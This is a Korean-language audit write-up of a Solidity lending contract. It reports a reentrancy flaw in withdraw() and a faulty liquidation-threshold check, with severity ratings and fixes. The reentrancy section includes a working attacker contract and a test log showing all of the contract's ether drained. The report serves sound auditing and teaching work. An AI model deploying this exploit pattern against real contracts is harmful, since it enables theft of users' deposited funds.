## 김남령

## 미구현된 부분: Accured Interest, Healthy

## 1. Reentrancy

### 설명

문제 코드: DreamAcademyLending.sol 내 withdraw() 함수 전체

withdraw 함수에서 예치한 이더리움 담보를 보낼 때 담보에 대한 정보를 업데이트 하지 않은 채로 송금을 먼저 수행하기 때문에 발생한 문제이다.

```java
function withdraw(address _tokenAddress, uint256 _amount) external{
  _update();
  uint256 availableWithdraw =  vaults[msg.sender].borrowUSDC *1e18 / oracle.getPrice(address(0x0)) * LTV / 100;
  VaultInfo memory tempVault = vaults[msg.sender];

  require(tempVault.collateralETH >= _amount, "INSUFFICIENT_AMOUNT");
  require(tempVault.collateralETH - availableWithdraw >= _amount);

  tempVault.collateralETH -= _amount;
  (bool success, ) = payable(msg.sender).call{value: _amount}("");
  require(success, "ERROR");

  vaults[msg.sender] = tempVault;

}
```

withdraw 함수는 tempVault라는 지역변수를 선언해 사용자의 담보 정보를 가져오는데, 이를 업데이트하는 `vaults[msg.sender] = tempVault;` 구문이 송금 이후에 위치해있다. 이는 Checks - Effects - Interaction 패턴에 벗어나며, 외부 함수의 호출로 인한 reentrancy 취약점이 발생할 수 있다.

### 파급력

Critical

-   산정 이유
    -   공격자가 1 wei만 가지고 있더라도 연속적인 공격 수행으로 lending 컨트랙트의 모든 이더리움 담보를 탈취할 수 있다.
-   공격 시나리오

    ```java
    contract Reentrancy {
      DreamOracle dreamOracle;
      DreamAcademyLending lending;
      address owner;
      constructor(DreamAcademyLending _lending){
          lending = _lending;
          owner = msg.sender;
      }

      function attack() external payable {
        require(msg.value >= 100 ether, "msg.value more than 1 ether");
        (bool success, )= address(lending).call{value: msg.value}(abi.encodeWithSelector(lending.deposit.selector, address(0x0), msg.value));
        (bool success2, )= address(lending).call(abi.encodeWithSelector(lending.withdraw.selector, address(0x0), msg.value));
      }

    	function transfer() public payable {
        (bool success,) = msg.sender.call{value: address(this).balance}("");
      }

      receive() external payable {
    	  uint targetBalance = address(lending).balance;
    	  if(targetBalance > 100 ether){
          (bool success3, )= address(lending).call(abi.encodeWithSelector(lending.withdraw.selector, address(0x0), 100 ether));
    	  }
      }
    }
    ```

    -   위와 같이 reentrancy를 유발하는 컨트랙트를 작성할 수 있다.
    -   공격자는 임의의 자산을 예치하고, 예치한 자산의 일부를 withdraw를 호출하여 돌려받는다.
    -   receive 함수에 다시 withdraw를 호출하는 구문을 넣어 withdraw로 이더리움을 돌려받는 데에 성공하면 다시한번 withdraw를 호출한다.
    -   Lending 컨트랙트 내에서 아직 vault의 값이 업데이트 되지 않았으므로 모든 조건을 통과하고 call with value를 수행한다.
    -   모든 자금을 탈취하면 attack 함수의 동작이 종료되고, reenterancy 컨트랙트는 lending 컨트랙트의 모든 자산을 갖게 된다.
    -   이렇게 탈취한 자산은 공격자가 가져갈 수 있다.

    ```java
    function testReentrancy() external {
      reentrancy = new Reentrancy(lending);
      vm.deal(user1, 1000 ether);
      supplySmallEtherDepositUser2();
      console.log("user1 balance", user1.balance / 1 ether);
      console.log("reenter balance", address(reentrancy).balance / 1 ether);
      console.log("lending balance", address(lending).balance / 1 ether);
      vm.startPrank(user1);
        (bool success1,) = address(reentrancy).call{value: 100 ether}(abi.encodeWithSelector(reentrancy.attack.selector));
        (bool success3,) = address(reentrancy).call{value: 0 ether}(abi.encodeWithSelector(reentrancy.transfer.selector));
      vm.stopPrank();
      console.log("user1 balance", user1.balance / 1 ether);
      console.log("reenter balance", address(reentrancy).balance / 1 ether);
      console.log("lending balance", address(lending).balance / 1 ether);
    }
    ```

    ```java
    [PASS] testReentrancy() (gas: 657090)
    Logs:
      user1 balance 1000
      reenter balance 0
      lending balance 1000
      0
      0
      0
      0
      0
      0
      0
      0
      0
      0
      0
      user1 balance 2000
      reenter balance 0
      lending balance 0
    ```

### 해결 방안

-   이더리움 송금 구문 이전에 vault의 값을 업데이트해주어야 한다

## 2. False Liquidation Threshold

### 설명

문제 코드: DreamAcademyLending.sol 내 liquidate함수, 111번 줄

-   Liquidation threshold를 계산하는 과정이 잘못되었다. 담보가 아닌 ETH의 가격을 기준으로 청산 기준을 결정하였다.
-   또한 등호를 추가해야 한다.

```java
uint price = vaults[_user].borrowUSDC * (oracle.getPrice(address(0x0))/oracle.getPrice(_tokenAddress));
require(price > oracle.getPrice(address(0x0))*75/100);
```

-   빌린 USDC의 가치를 ETH 기준으로 환산한 값과 현재 ETH 가격을 비교해서 75% 이하인 경우 청산을 시작한다.
-   Liquidation은 빌린 돈의 가치가 “담보”의 75% 아래일 때를 기준으로 계산해야 한다.
-   현재는 담보를 1 ETH로 가정하고 식을 세웠다.

### 파급력

High

-   산정 이유
    -   DEX의 효용성을 매우 떨어뜨리며, 공격의 접근성이 아주 높다.
    -   담보를 1 ETH로 고정해두었기 때문에 부채가 클수록 청산되기 쉽다.


### 해결 방안

-   등호를 추가해야 하며, 1 ETH가 아닌 실제 담보가치가 부채보다 25% 이상 낮을 경우 청산이 시작되도록 고친다.

```java
require(price >= ${Collateral_Amount} * oracle.getPrice(address(0x0)) * 75/100);
```
 
